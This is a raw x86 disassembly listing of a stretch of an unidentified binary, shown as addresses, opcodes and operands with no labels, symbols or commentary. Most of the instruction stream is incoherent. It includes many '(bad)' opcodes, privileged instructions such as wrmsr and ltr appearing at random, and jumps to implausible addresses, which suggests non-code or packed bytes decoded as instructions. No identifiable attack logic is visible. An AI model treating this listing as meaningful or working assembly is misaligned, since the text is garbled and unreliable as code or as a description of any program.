  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
